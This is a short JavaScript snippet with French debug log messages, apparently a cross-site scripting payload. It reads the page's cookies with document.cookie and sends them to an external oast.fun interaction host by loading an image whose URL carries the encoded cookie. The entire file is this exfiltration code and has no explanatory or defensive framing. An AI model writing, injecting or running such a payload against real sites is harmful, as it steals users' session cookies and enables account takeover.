console.log('[DEBUG] Script exécuté');

try {
    const cookie = document.cookie;
    console.log('[DEBUG] Cookie lu :', cookie);

    const img = new Image();
    img.src = 'https://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?cookie=' + encodeURIComponent(cookie);

    console.log('[DEBUG] Image exfiltration lancée');
} catch (err) {
    console.error('[DEBUG] Erreur dans le script :', err);
}
